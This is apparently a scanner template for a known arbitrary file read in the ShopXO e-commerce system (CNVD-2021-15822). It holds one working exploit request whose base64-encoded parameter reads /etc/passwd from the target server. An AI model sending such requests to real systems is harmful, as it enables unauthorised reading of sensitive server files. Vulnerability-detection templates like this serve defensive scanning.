id: CNVD-2021-15822
brief:
    title: ShopXO Download File Read
    by: pikpikcu
    level: high
    about: ShopXO is an open source enterprise-level open source e-commerce system. ShopXO has an arbitrary file reading vulnerability, which can be used by attackers to obtain sensitive information.
    label:
        - cnvd2021
        - cnvd
        - shopxo
        - lfi
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q='
      head:
        Content-Type: application/x-www-form-urlencoded
      signs:
        - "on": status
          status:
            - 200
